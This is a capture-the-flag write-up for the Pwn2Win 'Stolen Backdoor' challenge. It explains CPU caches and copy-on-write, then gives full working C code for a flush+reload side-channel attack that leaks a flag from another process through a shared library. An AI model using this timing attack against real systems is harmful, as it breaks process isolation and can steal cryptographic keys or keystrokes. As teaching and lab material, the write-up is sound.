# Stolen Backdoor
# writeup
Context: 
The RFs were able to get a low priv backdoor in one of the butcherCoprps's machines. Apparently this server is connected to the remains of an captured android and it's being used to study the behaviour of the rebelious droids. There's not much left of the android besides its network interface called omninet and its chip running its hkernel. Radio frequency analysis suggest a constantly activity comming from the machine, as if the robot was trying to send a message to the other androids.

We got only a sample of the programs that encrypt the message before send and we need you to discover what the android is trying to send.
(Note that escaling privilege is not necessary to solve the challenge.)

This challenge provide us with a server that runs our elf for 5 seconds on a non privileged user and there is another process called "encoder" running on server.

# Binary analysis
```
root@esoj:/tmp/writeup/attachments/src# checksec encoder
[*] '/tmp/writeup/attachments/src/encoder'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
root@esoj:/tmp/writeup/attachments/src# checksec libemojinet.so
[*] '/tmp/writeup/attachments/src/libemojinet.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
 
 Let`s decompile the encoder it with ghidra
```

void FUN_00101165_MAIN(void)

{
  int i;
  int j;
  
  do {
    i = 0;
    while ("CTF-BR{REDACTED_REDACTED_REDACTED_REDAC}"[i] != '\0') {
      printTranslate((ulong)(uint)(int)"CTF-BR{REDACTED_REDACTED_REDACTED_REDAC}"[i],0xa0);
      usleep(10);
      i = i + 1;
    }
    putchar(10);
    j = 0;
    while (j < 0x1e) {
      putchar(0x2d);
      j = j + 1;
    }
    printf(" End of transmission ");
    j = 0;
    while (j < 0x1e) {
      putchar(0x2d);
      j = j + 1;
    }
    putchar(10);
    usleep(5000);
  } while( true );
}

```
So there's ininite loop that iterates over the falg, calling the function printTranslate() using each one of the flag characters as argument.Running encoder in our machine, shows:

```
root@esoj:/tmp/writeup/attachments/src# LD_LIBRARY_PATH=./ ./encoder 
🏼⚕🤓‍️🧙🤽🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼🏽
------------------------------ End of transmission ------------------------------
🏼⚕🤓‍️🧙🤽🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼🏽
------------------------------ End of transmission ------------------------------
🏼⚕🤓‍️🧙🤽🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼🏽
------------------------------ End of transmission ------------------------------
🏼⚕🤓‍️🧙🤽🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼⚕🏻🤷☞🧙🏻🤷🏿🏼🏽
------------------------------ End of transmission ------------------------------
```

It looks like that the \"encription\" being used its just converting ascii characters to emojis.

Decompiling the function printTranslate reveals:
```
undefined8 printTranslate(char flag_char,int granularity)

{
  undefined8 int;
  int wchar_t_emoji;
  
  if ((flag_char < '-') || ('}' < flag_char)) {
    int = 0xffffffff;
  }
  else {
    if ((uint)(((int)flag_char + -0x2d) * granularity) < 0x33d1) {
      wchar_t_emoji = emojiLib[(uint)(((int)flag_char + -0x2d) * granularity)];
      setlocale(6,"en_US.utf8");
      printf("%lc",(ulong)(uint)wchar_t_emoji);
      int = 0;
    }
    else {
      int = 0xfffffffe;
    }
  }
  return int;
}
```

There's also a function that returns a pointer to the libemoji array:
```
undefined1 * getEmojis(void)

{
  return emojiLib;
}
```

So the program is basically using each letter of the flag to access one emoji and print that emoji. each one of the emojis have 4 bytes in size. A common type for unicode characters in C with 4 bytes size is wchar_t. So the printTranslate function selets one unicode character as:
wchar_t emojilib={....}
printed_char = emojilib[(flag[i] - '-')\*multiplier];
where multiplier is known as 160 (0xa0)
note that there is a spacing of 160\*4 = 640 bytes for each input character.

But so far, this process is running as root and there is no interaction with any external environment nor input, so there'so no way to leak the flag using classic memory corruption vulnerabilities such as buffer overflows or format string exploits. And the challenge description tells us that we should be able to leak the flag without escalating privilege. 

# Copy-On-Write (COW)

Copy on write is a mechanism used to more efficiently manage memory in a system. It works so that whenever a process needs to duplicate a memory page that it isnt modified the new process and the original owener of that page can share the same phisical address for that page. If eventually the new process needed to modify that page, a new copy is created and the processes no longer share the same phisical addresses. Once a significant part of the data in memory is static, such as .text sections or .data sections that means the memory cost of a new processes is basicaly manage the stack segment, heap and its own .text section, since shared libraries such as libc will be stored as COW, significantly reduccing the ammount of memory space consumed. 

# Hardware cache operation
Cache is small memory that helps the cpu in reducing the memory access time. In moderns systems, every time that a byte is queried by the cpu, a lot more of date goes over the memory bus, because the memory bus size is 64bits and memories are optmized for operating in burst mode. Whenever a stream of data comes from the memory bus, it's stored on cpu cache, so if the processor requests a data that was already on cache, there's no need to request to memory again, saving a significant ammount of time.

when requesting to cache, the addres requested is divided like this:

31  <--- T ---><--- S ---><--- 0 ---> 0

where the O is the offset of that byte in the cache. S is the cache Set, the address of that line in cache. T is the Tag, used to check if the address requestes matches the cache contents.
Each cache line holds an ammount of 2^O bytes of data. 
In 32 bits cpus for example a cahce with 256 lines of 64 bytes each line will have:

TAG bits 31---15

Offset bits 5---0

Cache Set 14---6

# Cache associativity
Imagine that in the cpu example above there was two requested addresses from CPU:

addr1: 0b11000011110000 01010111 000000 (0xC3C15C0)
addr2: 0b00111100001111 01010111 000000 (0x3C3D5C0)

cache set_1 = 0b01010111
cache set_2 = 0b01010111
tag_1=11000011110000
tag_2=00111100001111

That is a case of colision in that cache. because both lines generates the same cache address. In order to mitigate that, engineers started to use associative cache, where each address of cache can hold more than one line of data

| cache set | tag1 | line 1 | tag 2 | line 2 |
| ------ | ------ | ------ | ------ | ------ | 
| 0x57 | 0x30F0 | data1 here |0x0F0F |data2 here | 
| 0x58 | ------- | ---------- | ------ |..... | 

In modern CPU cache is common up to 8-way associativy. So in order to remove a cache line from the cpu it may be necessary up to 8 requests of data with same 14-6 bytes. But it's important to remember that the number of bits in the cache set mask may vary depending the size of the cache.

# Exploiting time access in Copy-On-Write on shared pages
Since the encoder program uses a shared lib that's probably mapped as copy on write on the physical memory, we could use the diference in memory response time to see if one memory line of the emojilib array was acessed by the encoder function while our program was running. If the line was accessed by other program, when we requested it again, the read instruction should be faster becouse that information is already on the cache. Knowing what emojis are accessed it's possible to leak the original flag.
This exploit is a variant of the flush+reload attack, a famous and quite old side channel attack also used on spectre and meltdown attacks as covert side channel.
The knowlage of 2 specific instructions are necessary for performing the flush+reload attack:

CLFLUSH - Flush Cache Line:

| Opcode / Instruction	| Op/En	| 64-bit Mode	|Compat/Leg Mode	| Description | 
| ------ | ------ | ------ | ------ | ------ | 
|NP 0F AE /7 CLFLUSH m8|	M|	Valid|	Valid|	Flushes cache line containing m8.|

Invalidates from every level of the cache hierarchy in the cache coherence domain the cache line that contains the linear address specified with the memory operand. If that cache line contains modified data at any level of the cache hierarchy, that data is written back to memory. The source operand is a byte memory location.

RDTSC — Read Time-Stamp Counter:

| Opcode / Instruction	| Op/En	| 64-bit Mode	|Compat/Leg Mode	| Description | 
| ------ | ------ | ------ | ------ | ------ | 
|0F 31	|RDTSC	|ZO	|Valid	|Valid	| Read time-stamp counter into EDX:EAX.|

Reads the current value of the processor’s time-stamp counter (a 64-bit MSR) into the EDX:EAX registers. The EDX register is loaded with the high-order 32 bits of the MSR and the EAX register is loaded with the low-order 32 bits. (On processors that support the Intel 64 architecture, the high-order 32 bits of each of RAX and RDX are cleared.)


Therefore it's possible to use CLFLUSH to invalidate cache lines and use RDTSC to measure the time of execution of an access like ```mov eax,[ebx]```

# Measuring time and then evicting a line
Its important to evict the line after measuring it's response time to avoid a false positive when measuring the same line again later
```
 unsigned long probe_timing(char *adrs) {
    volatile unsigned long time;

    asm volatile(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}
```
# Checking if the sistem is vulnerable
This attack is based on the premise that the cpu cache is considerably faster than the main memory. in order to test it:
```
char globalVar[4096]={1,4,7,8,5,9,1};

int main(){

  unsigned long t1,t2;
  unsigned long count=0;
  double total_access,total_evict;

  total_access=0;
  total_evict=0;
  for(unsigned i=0;i<100;i++){
    if (i%2==0){
      maccess((void *)&globalVar[44]);
    }
    t1=probe_timing((void *)&globalVar[44]);
    count++;
    if (i%2==0){
      printf("time w acess: %lu\n",t1);
      total_access+=(double)t1;

    }
    else{
      printf("time no acess: %lu\n",t1);
      total_evict+=(double)t1;
    }

  
  }
  printf("avg cached=%lf\n",total_access/50);
  printf("avg evicted=%lf\n",total_evict/50);

  return 0;
```
This should return something like this (in my machine, maybe it's necessary to check on server also):
```
...
time w acess: 68
time no acess: 304
time w acess: 66
time no acess: 308
avg cached=68.400000
avg evicted=347.200000
root@esoj:/tmp/writeup/attachments/src# head /proc/cpuinfo 
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 158
model name	: Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz
stepping	: 9
cpu MHz		: 3408.006
cache size	: 6144 KB
```
![Memory response time diference ](https://gitlab.com/pwn2win/pwn2win-2020/-/raw/master/pwn-Stolen%20Backdoor/src/writeup/images/cache.png)


That's a diference of almost 280 cycles, so its more than suficient to define wheter the line in on cache or in main memory.I am define the threshold as 160.
Also, searching in google shows that intel cpus usually have 64 bytes cache line lenght.

So our exploit will be:
```
void watchOrder(wchar_t *base,unsigned char *set,char *output){
	register unsigned j,i;
	register unsigned used;
	register unsigned long time_fast;

	j=0;
	while (j<PROBE_AMMOUNT_ORDER){
	  for (i=0;set[i]!='\0';i++){
		used=set[i]-'-';

        //same access rules as in printTranslate
		time_fast=probe_timing((char *)(&base[G*used]));
	 	if(time_fast < 0xa0 ){
			output[j]=used+'-';
			j++;
		}	
	  }
	}
	output[j]='\0';
}
```
# Breaking process isolation
Because of COW, two process using the same shared library will be sharing the same phisical address, (so ASLR doesn't matter in this case). There will be 2 threads running concorrent: spy and encoder:

|time| thread | action | response time | result | 
|---|---|---|---|----|
|t0 | spy | probes 0xFF00FF00 | too long |inconclusive|
|t1 | spy | probes 0xFF010180 | too long | inconclusive|
|t2 | encoder| maccess 0xFF010400, goes to cache | too long | --- |
|t3 | spy  | probes 0xFF010400 | short, is on cache!  | leaked a letter!!! |

# Circumvent the problems
Using a sequence like this can cause a lot of noise because of two major problems:
```
unsigned char set0[]="-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}";
watch(base,set0,strlen((const char *)set0));
```
- the set loop is too long that it may not be completed while the interest variable is in the cache
- It is made of sequences that are in order so may induce the hardware prefetcher to pull nearby lines. If the prefetcher pulls the line associated to 0 an then the next 10 ```(160*(sizeof(wchar_t))/64)``` lines it pulls the line associated to the number 1, causing a false positive.

example of the output of this approach:
```
./spy 
REDA-C}-CTF-BR{REDA--TEDREDA---CTEDREDACTEDREDA--C}-CTF-BDCTE-REDA-C}C-TF-{EBRDA-CTEDREDA-CTEDREACTEDREDA--C}-CTF-BR{RED-ACTEDREDA-CTEDREDA-------------------------------CTEDR-D---------------------AC}CTF-BR{REDA-CTEDREDA-CTEDREDA-CTEDREDAC}-CTF-BR{REDA-C--TEDREDRDACTEDR-E--DA---------C}CTF-BR{REDA-CTEDREDA-CTEDREDA-CTEDREDAC}--CTF-BR{REDA-CTEDREDA-----------------CTEDREDA-C--T--EDREDA---C}-EDA-C}-CTF-BR{REDA-C-TEDREDA-TEDREDA-C--TEDRECTF-BR{REDA-CTEDREDA-CTEDREDA-CTED-REDA-C}---CTF-BR{REDA-CTED-EDA-CTEDREDA-CTEDREDC}CTF-BRREDACTEDREDACTEDREDA-CTEDREDA-CCTF-BR{REDA-CTEDREDA-CTED-REDACTEDREDA-}--CTF-BR{RED-ACTEDREDA-CTEDREDA-CTEDREDA--C}CTF-BR{REDACTED-REDA--CTED-REDA-CTEDREA-C}-CTF-BR{REDA-C--EDEA--C-TEDREDA--CTEDREDA-C-}---CTF-B-R{REDA-CTE
```

# Making a more optimized approach 
- inseted of probing for all ascii characters , first discover what characters are being used
- never use a string with sequence chars as argument to the probe loop, always mix them to avoid prefetcher noise.
 

```
char globalVar[4096]={1,4,7,8,5,9,1};
int threshold;

//lets compute the limit of what is cache and what is main memory
void computeThreshold(){

  unsigned long t1,t2;
  unsigned long count=0;
  double total_access,total_evict;

  total_access=0;
  total_evict=0;
  for(unsigned i=0;i<(TOTAL_TESTS *2);i++){
    if (i%2==0){
      maccess((void *)&globalVar[44]);
    }
    t1=probe_timing((void *)&globalVar[44]);
    count++;
    if (i%2==0){
      //printf("time w acess: %lu\n",t1);
      total_access+=(double)t1;

    }
    else{
      //printf("time no acess: %lu\n",t1);
      total_evict+=(double)t1;
    }
    //ensures that clflush will be called before entering in a new loop test
    asm __volatile__("mfence\nlfence\n");
  
  }
  total_access=total_access/TOTAL_TESTS;
  total_evict=total_evict/TOTAL_TESTS;
  printf("avg cached=0x%x\n",(int)total_access);
  printf("avg evicted=0x%x\n",(int)total_evict);
  
  threshold= (int)(total_evict*0.5+total_access*0.5);
}

//lets shuffle the order to avoid prefetcher preditcion
void randomize(unsigned char *string){

	size_t len=strlen(string);
	int random;
	char tmp;
	for(int i=0;string[i]!='\0';i++){
	  random=rand()%len;
	  tmp=string[i];
	  string[i]=string[random];
	  string[random]=tmp;
	  if (i >2){
	    if((string[i]-string[i-1])<2){
	      i--;
	      
	    }
	  }
	
	}


}
void watch(wchar_t *base,unsigned char *set,int *output){

	register unsigned j,i;
	register unsigned used;
	register unsigned long time_fast;

	j=0;
	while (j<PROBE_AMMOUNT){
	  
	  for (i=0;set[i]!='\0';i++){
		used=set[i]-'-';

		time_fast=probe_timing((char *)(&base[G*used]));
	 	if(time_fast < threshold ){
			output[used]++;
			j++;
		}
		
	  }

	}
}
void watchOrder(wchar_t *base,unsigned char *set,char *output){

	register unsigned j,i;
	register unsigned used;
	register unsigned long time_fast;

	j=0;
	while (j<PROBE_AMMOUNT_ORDER){
	  
	  for (i=0;set[i]!='\0';i++){
		used=set[i]-'-';

		time_fast=probe_timing((char *)(&base[G*used]));
	 	if(time_fast < threshold ){
			output[j]=used+'-';
			j++;
		}	
	  }
	}
	output[j]='\0';
}

int main(){
	wchar_t *base;
	int i,j;
	//'}' - '-' = 0x50
	//total of chars to test
	int dict[0x52];
	unsigned char valids[0x52];
	char flag[PROBE_AMMOUNT_ORDER+1];

	computeThreshold();
	printf("using threshold 0x%x \n",threshold);

	base=getEmojis();
	memset((void *)dict,0,sizeof(int)*0x52);

	unsigned char set0[]="M\\AV/K?e0DkC";
	unsigned char set1[]="G]bYt|NWwJC";
	unsigned char set2[]="ongP9H6vhzC";
	unsigned char set3[]="p-xRQ.2rXUC";
	unsigned char set4[]=">;71=`4l5jC";
	unsigned char set5[]="d3^B@{[L<fC";
	unsigned char set6[]="uSyTOsZi8C";
	unsigned char set7[]="cIEa_mqF}:C";


	watch(base,set0,dict);
	watch(base,set1,dict);
	watch(base,set2,dict);
	watch(base,set3,dict);
	watch(base,set4,dict);
	watch(base,set5,dict);
	watch(base,set6,dict);
	watch(base,set7,dict);
	
	
	j=0;
	for (i=0;i<0x51;i++){
	  if(dict[i]>4){
            valids[j]=(char)(i+'-');
	    j++;
	  }
	}
	valids[j]='\0';
	
	printf("valid chars: %s\n",valids);
	
	srand(time(NULL));
	randomize(valids);
	
	watchOrder(base,valids,flag);
	printf("flag here: %s\n",flag);

	return 0;

}



```

```
./solve 
valid chars: -ABCDEFRT_{}
flag here: DFEDACEDREDAC}CTF-BR{RDACTE_REDACTED_REDACED_REDAC}CTF-BR{REDACTED_DATED_REDACTED_REDAC}TF-B{REDACED_REACTED_EDACTED_EDAC}CTFBR{REDACTED_RDACTED_REDACED_EDA}CF-BR{REACTED_REDACTD_RDACTEDRDAC}CFBR{RDACTED_REDACED_REACTEEDACCTF-BR{EDACEDRDATED_REDACE_REDAC}CTF-R{REDATD_REDACTED_REACTD_REDAC}TFBREDACTED_RACTED_REDACTED_REDA}CBR{REDACTED_REDACTED_REACTED_DAC}CTF-B{REDAED_REDACTD_EDACTED_REDAC}C{EADCE_

```

After writing a client that will send the exploit to the server:

```
./client.py 
Hello there.
ps -aux | grep encoder
root         8  3.1  0.0   2356   732 ?        S    23:06   0:01 /home/manager/encoder
Give me how many bytes (max: 100000)
Send 'em!
Position in queue: 1
Here are the first 10000 bytes of your output:
avg cached=0x2e
avg evicted=0x126
using threshold 0xaa
valid chars: -0134BCFLRTW_bcdeilnrsw{}
flag here: LnFCTF-{Tr4sc3dence_R3bell1_wiL_CTF-B{r43ndenceR3bell10n_wiL_W1n}CTF-BR{T4nsc3dn_ell10n_wiLlW_1n}CF-BRr4ns3ndence_R3bel10n_wiLl_W1n}CTF-BR{Trnsc3ndence_R3ell0_wilW1n}CTF-R{r4nscndene_R3bell01nwiLl_CTF-BR{Tr4ns3ndence_R3bell10n_wiL_W1n}CTF-BR{Tr4nc3ndence_R3bell10n_wiLl_W1n}CTF-BR{Tr4nsc3ndeneR3bel1nl_wLilW1n}CTF-BR{Tr4nsc3ndenceR3bell10_wiLl_n}CTF-1n_l0n_wiL_W1n}CTF-R{Tr4nsc3ndence_R3bell10n_wiLl_
```

Besides some scrumbled chars, it's possible to obtain a valid flag ```CTF-BR{Tr4nc3ndence_R3bell10n_wiLl_W1n}```. If not possible, just take the valid parts of each try and join them together.
This vulnerability have been used for years to stole cryptographic keys or measuring key strokes. It's just one of many ways that microarchitecture attacks uses to break process isolation. 
There are other ways to achieve the leak using other side channel attacks such as flush+flush or evict+probe.



Esoj


   
# bibliography   
   
   https://people.freebsd.org/~lstewart/articles/cpumemory.pdf

   https://www.felixcloutier.com/x86/clflush

   https://online.tugraz.at/tug_online/voe_main2.getvolltext?pCurrPk=85809

   https://eprint.iacr.org/2013/448.pdf
   

